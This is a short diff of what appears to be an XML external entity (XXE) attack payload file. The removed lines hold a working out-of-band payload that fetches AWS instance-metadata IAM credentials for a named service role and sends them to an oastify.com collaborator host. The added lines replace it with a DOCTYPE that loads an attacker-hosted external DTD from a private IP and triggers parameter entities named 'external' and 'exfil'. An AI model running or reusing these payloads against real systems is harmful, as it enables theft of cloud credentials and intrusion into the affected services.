@@ -1,4 +1,8 @@
-<!ENTITY % file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/epps-prod-ratesheets-iam-servicerole-us-west-2">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://zps44917etvhmlwczfxgocflrcx3lt9i.oastify.com/?xxe=%file;'>">
-%eval;
-%exfiltrate;
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE oob [
+<!ENTITY % base SYSTEM "http://192.168.49.54:80/external.dtd"> 
+%base;
+%external;
+%exfil;
+]>
+
